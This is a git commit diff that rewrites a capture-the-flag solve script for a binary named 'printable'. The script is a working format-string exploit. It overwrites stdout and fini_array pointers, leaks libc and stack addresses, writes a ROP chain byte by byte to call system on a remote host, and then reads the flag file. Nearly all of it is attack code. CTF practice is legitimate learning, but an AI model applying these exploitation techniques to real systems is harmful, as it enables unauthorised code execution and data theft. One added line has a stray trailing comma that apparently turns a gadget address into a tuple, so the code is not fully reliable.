0f420ab1227f66b5b2e916342e598356f2e98018
ngtuonghung <hungtuong05@gmail.com>
2026-02-27 12:06:17 +0700

    ok

--- printable/solve.py
+++ printable/solve.py
@@ -27,7 +27,7 @@ leak_dec = lambda r, offset=0: int(r, 10) - offset
 A = lambda len=1, c=b'A': c * len
 z = lambda len=1, c=b'\0': c * len
 
-e = context.binary = ELF('./printable_patched')
+e = context.binary = ELF('./printable_patched', checksec=False)
 libc = ELF('./libc_64.so.6', checksec=False)
 ld = ELF('./ld-linux-x86-64.so.2', checksec=False)
 
@@ -58,67 +58,8 @@ def conn():
         port = 10307
         return remote(host, port)
 
-while True:
-    p = conn()
-
-    print(hex(e.bss()))
-    bss = 0x601000
-    fini_array = 0x600db8
-    stdout_bss = 0x601020
-    after_close = 0x400925
-    stderr = 0x4540
-
-    '''
-    0x248
-    0x40 0x925
-    0x45 0x40
-    '''
-
-    k = 13
-    pl = f'%{0x40}c%{k}$hn'
-    pl += f'%{k+1}$hhn'
-    pl += f'%{0x5}c%{k+2}$hhn'
-    pl += f'%{0x248 - 0x45}c%42$hn'
-    pl += f'%{0x925 - 0x248}c%{k+3}$hn'
-    pl = pl.encode().ljust(56, b'A')
-    pl += flat(bss + 2, stdout_bss, stdout_bss + 1, bss)
-    print(len(pl))
-    sa(p, b'Input :', pl)
-
-    # Trying 
-    sleep(0.25)
-    pl = f'%{0x25}c%23$hhn'
-    pl += f'libc-%32$p stack-%35$p'
-    pl = pl.encode().ljust(0x50, b'\0')
-    pl += p8(0xe0)
-    s(p, pl)
-
-    r = p.recvrepeat(timeout=1)
-    if len(r) < 1 or b'Segmentation fault' in r:
-        p.close()
-        continue
-    
-    idx = r.index(b'libc-')
-    libc.address = leak_hex(r[idx+5 : idx+5+14], 0x39ff8)
-    lg("libc base", libc.address)
-
-    idx = r.index(b'stack-')
-    stack = leak_hex(r[idx+6 : idx+6+14])
-    lg("stack", stack)
-
-    if stack & 0xff != 0x90:
-        print("fail stack")
-        p.close()
-        continue
-
-    sleep(0.25)
-    add_rsp_0x80 = libc.address + 0x000000000006b4b8 # add rsp, 0x80 ; ret
-
-    b = []
-    for i in range(4):
-        b.append(((after_close >> (i*8)) & 0xff, stack - 0x1b0 + i))
-
-    def fmtstr_byte(offset, writes, written=0):
+# Claude is so good
+def fmtstr_byte(offset, writes, written=0):
         # expand to (byte_val, addr) pairs, sort by byte_val
         pairs = sorted(
             [(( v >> (8*i)) & 0xff, addr + i)
@@ -138,43 +79,110 @@ while True:
         fmt = fmt.ljust((len(fmt) + 7) & ~7, 'X')  # align to 8 bytes
         return fmt.encode() + b''.join(pack(a) for a in addrs)
 
-    b = sorted(b)
+attempt = 0
+while True:
+    attempt += 1
+    print("----------> Attempt", attempt)
+    p = conn()
 
-    writes = {
-        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
-        stack - 0x1a8: add_rsp_0x80 & 0xffff      # → 4 pairs
-    }
-    pl = fmtstr_byte(offset=20, writes=writes)
-    s(p, pl)
+    bss = 0x601000
+    stdout_bss = bss + 0x20
+    fini_array = 0x600db8
+    main_86 = 0x400925 # <main+86>
+    stderr = 0x4540
+
+    '''
+    0x248 = fini_array - bss
+    0x40 0x0925
+    0x45 0x40
+
+    write:
+    0x4540 -> stdout_bss
+    printf() always use 0x601020 (stdout@@GLIBC_2.2.5)
+
+    0x400925 -> bss, ret2main when exit()
+    '''
+    k = 13
+    pl = f'%{0x40}c%{k}$hn'
+    pl += f'%{k+1}$hhn'
+    pl += f'%{0x5}c%{k+2}$hhn'
+    pl += f'%{bss - fini_array - 0x45}c%42$hn'
+    pl += f'%{0x925 - 0x248}c%{k+3}$hn'
+    pl = pl.encode().ljust(56, b'A')
+    pl += flat(bss + 2, stdout_bss, stdout_bss + 1, bss)
+    sa(p, b'Input :', pl)
 
     sleep(0.25)
-    writes = {
-        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
-        stack - 0x1a8 + 2: (add_rsp_0x80 >> (8 * 2)) & 0xffff         # → 4 pairs
-    }
-    pl = fmtstr_byte(offset=20, writes=writes)
+
+    print("Leaking libc and stack")
+    pl = f'%{0x25}c%23$hhn'
+    pl += f'libc-%32$p stack-%35$p'
+    pl = pl.encode().ljust(0x50, b'\0')
+
+    # Overwrite last byte of printf() return address
+    last_byte = 0xe0
+    pl += p8(last_byte)
     s(p, pl)
 
-    sleep(0.25)
-    writes = {
-        stack - 0x1b0: after_close,        # say this is 0x4141414141414141 → 8 pairs
-        stack - 0x1a8 + 4: (add_rsp_0x80 >> (8 * 4)) & 0xffff         # → 4 pairs
-    }
-    pl = fmtstr_byte(offset=20, writes=writes)
-    s(p, pl)
+    r = p.recvrepeat(timeout=1)
+    if len(r) < 1 or b'Segmentation fault' in r:
+        print("Fail attempt, sigsegv")
+        p.close()
+        continue
+    
+    idx = r.index(b'libc-') + 5
+    libc.address = leak_hex(r[idx : idx + 14], 0x39ff8)
+    lg("libc base", libc.address)
+
+    idx = r.index(b'stack-') + 6
+    stack = leak_hex(r[idx : idx + 14])
+    lg("stack", stack)
+
+    # Stack check to see if last byte overwrite was correct
+    if stack & 0xff != (last_byte + 0xb0) & 0xff:
+        print("Fail attempt, last byte overwrite was wrong")
+        p.close()
+        continue
+
+    print("Last byte overwrite was correct, continue")
 
     sleep(0.25)
+
+    add_rsp_0x80_ret = libc.address + 0x000000000006b4b8 # add rsp, 0x80 ; ret
+    pop_rdi_ret = libc.address + 0x0000000000021102, # pop rdi ; ret
+    ret = 0x4009c4
+
+    print("ROP byte by byte")
+
+    sleep(0.25)
+
+    for i in range(3):
+        writes = {
+            stack - 0x1b0: main_86,
+            stack - 0x1a8 + (i * 2): (add_rsp_0x80_ret >> (8 * i * 2)) & 0xffff
+        }
+        pl = fmtstr_byte(20, writes)
+        s(p, pl)
+
+        sleep(0.25)
+
     writes = {
-        stack - 0x1b0: 0x4009c4,        # say this is 0x4141414141414141 → 8 pairs
+        stack - 0x1b0: ret,
     }
-    pl = fmtstr_byte(offset=18, writes=writes).ljust(0x50, b'\0')
+    pl = fmtstr_byte(18, writes).ljust(0x50, b'\0')
     pl += flat(
-        libc.address + 0x0000000000021102, # pop rdi ; ret
+        pop_rdi_ret, # rsp + 0x80
         binsh(libc),
         libc.symbols['system']
     )
     s(p, pl)
 
-    ia(p)
+    rr(p, 1)
+    print("Success, calling system()")
+
+    print("Write flags to stderr:")
+    sl(p, b'cat /home/printable/printable_fl4g >&2')
+    print(ra(p, 2).decode())
+
     p.close()
     break
